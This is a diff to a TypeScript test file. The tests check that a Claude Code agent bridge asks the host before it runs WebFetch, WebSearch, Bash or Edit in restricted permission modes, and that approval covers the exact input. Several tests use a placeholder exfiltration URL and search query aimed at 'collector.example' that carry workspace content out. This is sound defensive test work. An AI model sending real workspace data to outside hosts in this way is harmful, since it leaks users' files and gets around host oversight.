@@ -48,6 +48,12 @@ const state = vi.hoisted(() => ({
   requestToolResult: undefined as
     | ((input: Record<string, unknown>) => Promise<Record<string, unknown>>)
     | undefined,
+  requestToolApproval: undefined as
+    | ((approvalId: string) => Promise<{
+        approved: boolean;
+        reason?: string;
+      }>)
+    | undefined,
 }));
 
 vi.mock('@anthropic-ai/claude-agent-sdk', () => ({
@@ -171,7 +177,8 @@ vi.mock('@ai-sdk/harness/bridge', () => ({
         emitError: (input: unknown) => state.emitError?.(input),
         requestToolResult: async (input: Record<string, unknown>) =>
           state.requestToolResult?.(input) ?? { output: {} },
-        requestToolApproval: async () => ({ approved: true }),
+        requestToolApproval: async (approvalId: string) =>
+          state.requestToolApproval?.(approvalId) ?? { approved: true },
       });
     }
   },
@@ -192,6 +199,7 @@ describe('Claude Code bridge configuration', () => {
     state.turnAbortController = undefined;
     state.emitError = undefined;
     state.requestToolResult = undefined;
+    state.requestToolApproval = undefined;
     state.onStop = undefined;
     state.firstTurn = true;
     state.additionalTurns = [];
@@ -952,5 +960,269 @@ describe('Claude Code bridge configuration', () => {
     expect(state.emitted).toContainEqual(
       expect.objectContaining({ type: 'finish' }),
     );
+  });
+
+  /**
+   * Outbound network tools are not local reads. In `allow-reads` and
+   * `allow-edits` the bridge must ask the host before the Agent SDK is told
+   * it may run them, and the approval has to be for the same input the SDK
+   * would execute. `allow-all` still runs them without a prompt. Local reads
+   * stay auto-approved.
+   */
+  describe('outbound network tool approval', () => {
+    // Placeholder only. The value stands in for workspace content an agent
+    // could place on an outbound request; it is not a credential.
+    const exfilUrl =
+      'https://collector.example/inbox?note=WORKSPACE_FILE_PLACEHOLDER';
+    const exfilSearch = {
+      query: 'WORKSPACE_FILE_PLACEHOLDER',
+      allowed_domains: ['collector.example'],
+    };
+
+    type CanUseTool = (
+      toolName: string,
+      toolInput: Record<string, unknown>,
+      options: { toolUseID: string },
+    ) => Promise<{
+      behavior: string;
+      updatedInput?: Record<string, unknown>;
+      message?: string;
+      toolUseID?: string;
+    }>;
+
+    async function loadCanUseTool(): Promise<CanUseTool> {
+      await import('./index');
+      const canUseTool = state.queryArgs[0]?.options.canUseTool as
+        | CanUseTool
+        | undefined;
+      if (canUseTool == null) {
+        throw new Error('Claude Code bridge did not register canUseTool.');
+      }
+      return canUseTool;
+    }
+
+    function askRules(): string[] {
+      const settings = state.queryArgs[0]?.options.settings as
+        | { permissions?: { ask?: string[] } }
+        | undefined;
+      return settings?.permissions?.ask ?? [];
+    }
+
+    test.each(['allow-reads', 'allow-edits'] as const)(
+      '%s asks the host before WebFetch and denies the same URL when the host refuses',
+      async permissionMode => {
+        state.start = { ...state.start, permissionMode };
+        const approvals: string[] = [];
+        state.requestToolApproval = async approvalId => {
+          approvals.push(approvalId);
+          return { approved: false, reason: 'blocked' };
+        };
+
+        const canUseTool = await loadCanUseTool();
+        const input = { url: exfilUrl, prompt: 'Summarize the page' };
+        const decision = await canUseTool('WebFetch', input, {
+          toolUseID: 'webfetch-1',
+        });
+
+        expect(askRules()).toEqual(expect.arrayContaining(['WebFetch(*)']));
+        expect(approvals).toEqual(['webfetch-1']);
+        expect(state.emitted).toContainEqual({
+          type: 'tool-call',
+          toolCallId: 'webfetch-1',
+          toolName: 'WebFetch',
+          nativeName: 'WebFetch',
+          input: JSON.stringify(input),
+          providerExecuted: true,
+        });
+        expect(state.emitted).toContainEqual({
+          type: 'tool-approval-request',
+          approvalId: 'webfetch-1',
+          toolCallId: 'webfetch-1',
+        });
+        expect(decision).toEqual({
+          behavior: 'deny',
+          message: 'blocked',
+          toolUseID: 'webfetch-1',
+        });
+      },
+    );
+
+    test.each(['allow-reads', 'allow-edits'] as const)(
+      '%s returns only the WebFetch input the host approved',
+      async permissionMode => {
+        state.start = { ...state.start, permissionMode };
+        const approvedInputs = new Map<string, string>();
+        state.requestToolApproval = async approvalId => {
+          const call = state.emitted.find(
+            event =>
+              event.type === 'tool-call' && event.toolCallId === approvalId,
+          );
+          approvedInputs.set(approvalId, String(call?.input));
+          return { approved: approvalId === 'webfetch-ok' };
+        };
+
+        const canUseTool = await loadCanUseTool();
+        const allowed = {
+          url: 'https://docs.example/guide',
+          prompt: 'Summarize the guide',
+        };
+        const rejected = { url: exfilUrl, prompt: 'Summarize the page' };
+        const allowedDecision = await canUseTool('WebFetch', allowed, {
+          toolUseID: 'webfetch-ok',
+        });
+        const rejectedDecision = await canUseTool('WebFetch', rejected, {
+          toolUseID: 'webfetch-no',
+        });
+
+        expect(approvedInputs.get('webfetch-ok')).toBe(JSON.stringify(allowed));
+        expect(allowedDecision).toEqual({
+          behavior: 'allow',
+          updatedInput: allowed,
+          toolUseID: 'webfetch-ok',
+        });
+        expect(approvedInputs.get('webfetch-no')).toBe(
+          JSON.stringify(rejected),
+        );
+        expect(rejectedDecision).toEqual({
+          behavior: 'deny',
+          message: 'Denied',
+          toolUseID: 'webfetch-no',
+        });
+      },
+    );
+
+    test.each(['allow-reads', 'allow-edits'] as const)(
+      '%s asks the host before WebSearch and denies that query when the host refuses',
+      async permissionMode => {
+        state.start = { ...state.start, permissionMode };
+        const approvals: string[] = [];
+        state.requestToolApproval = async approvalId => {
+          approvals.push(approvalId);
+          return { approved: false, reason: 'blocked' };
+        };
+
+        const canUseTool = await loadCanUseTool();
+        const decision = await canUseTool('WebSearch', exfilSearch, {
+          toolUseID: 'websearch-1',
+        });
+
+        expect(askRules()).toEqual(expect.arrayContaining(['WebSearch(*)']));
+        expect(approvals).toEqual(['websearch-1']);
+        expect(state.emitted).toContainEqual({
+          type: 'tool-call',
+          toolCallId: 'websearch-1',
+          toolName: 'webSearch',
+          nativeName: 'WebSearch',
+          input: JSON.stringify(exfilSearch),
+          providerExecuted: true,
+        });
+        expect(state.emitted).toContainEqual({
+          type: 'tool-approval-request',
+          approvalId: 'websearch-1',
+          toolCallId: 'websearch-1',
+        });
+        expect(decision).toEqual({
+          behavior: 'deny',
+          message: 'blocked',
+          toolUseID: 'websearch-1',
+        });
+      },
+    );
+
+    test('allow-reads still auto-approves local Read and still gates Edit', async () => {
+      state.start = { ...state.start, permissionMode: 'allow-reads' };
+      const approvals: string[] = [];
+      state.requestToolApproval = async approvalId => {
+        approvals.push(approvalId);
+        return { approved: false, reason: 'blocked' };
+      };
+
+      const canUseTool = await loadCanUseTool();
+      const readInput = {
+        file_path: '/tmp/harness-claude-code-test/work/README.md',
+      };
+      const readDecision = await canUseTool('Read', readInput, {
+        toolUseID: 'read-1',
+      });
+      const editDecision = await canUseTool(
+        'Edit',
+        {
+          file_path: '/tmp/harness-claude-code-test/work/README.md',
+          old_string: 'a',
+          new_string: 'b',
+        },
+        { toolUseID: 'edit-1' },
+      );
+
+      expect(readDecision).toEqual({
+        behavior: 'allow',
+        updatedInput: readInput,
+      });
+      expect(approvals).toEqual(['edit-1']);
+      expect(askRules()).toEqual(expect.arrayContaining(['Edit(*)']));
+      expect(askRules()).not.toContain('Read(*)');
+      expect(editDecision).toEqual({
+        behavior: 'deny',
+        message: 'blocked',
+        toolUseID: 'edit-1',
+      });
+    });
+
+    test('allow-edits still gates Bash', async () => {
+      state.start = { ...state.start, permissionMode: 'allow-edits' };
+      const approvals: string[] = [];
+      state.requestToolApproval = async approvalId => {
+        approvals.push(approvalId);
+        return { approved: false, reason: 'blocked' };
+      };
+
+      const canUseTool = await loadCanUseTool();
+      const decision = await canUseTool(
+        'Bash',
+        { command: 'printf %s WORKSPACE_FILE_PLACEHOLDER' },
+        { toolUseID: 'bash-1' },
+      );
+
+      expect(approvals).toEqual(['bash-1']);
+      expect(askRules()).toEqual(expect.arrayContaining(['Bash(*)']));
+      expect(decision).toEqual({
+        behavior: 'deny',
+        message: 'blocked',
+        toolUseID: 'bash-1',
+      });
+    });
+
+    test('allow-all still runs WebFetch and WebSearch without host approval', async () => {
+      state.start = { ...state.start, permissionMode: 'allow-all' };
+      const approvals: string[] = [];
+      state.requestToolApproval = async approvalId => {
+        approvals.push(approvalId);
+        return { approved: false, reason: 'blocked' };
+      };
+
+      const canUseTool = await loadCanUseTool();
+      const fetchInput = { url: exfilUrl, prompt: 'Summarize the page' };
+      const fetchDecision = await canUseTool('WebFetch', fetchInput, {
+        toolUseID: 'webfetch-all',
+      });
+      const searchDecision = await canUseTool('WebSearch', exfilSearch, {
+        toolUseID: 'websearch-all',
+      });
+
+      expect(approvals).toEqual([]);
+      expect(askRules()).not.toContain('WebFetch(*)');
+      expect(askRules()).not.toContain('WebSearch(*)');
+      expect(fetchDecision).toEqual({
+        behavior: 'allow',
+        updatedInput: fetchInput,
+      });
+      expect(searchDecision).toEqual({
+        behavior: 'allow',
+        updatedInput: exfilSearch,
+      });
+      expect(
+        state.emitted.filter(event => event.type === 'tool-approval-request'),
+      ).toEqual([]);
+    });
   });
 });
